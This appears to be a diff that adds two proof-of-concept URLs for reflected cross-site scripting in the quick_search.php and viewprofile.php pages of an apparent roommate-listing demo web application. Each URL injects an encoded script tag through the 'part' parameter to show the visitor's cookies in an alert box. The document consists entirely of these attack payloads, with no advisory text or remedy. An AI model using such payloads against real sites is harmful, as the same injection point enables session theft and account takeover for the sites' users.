@@ -1,0 +1,2 @@
+http://www.example.com/roommate/demo/quick_search.php?part=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/roommate/demo/viewprofile.php?part=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
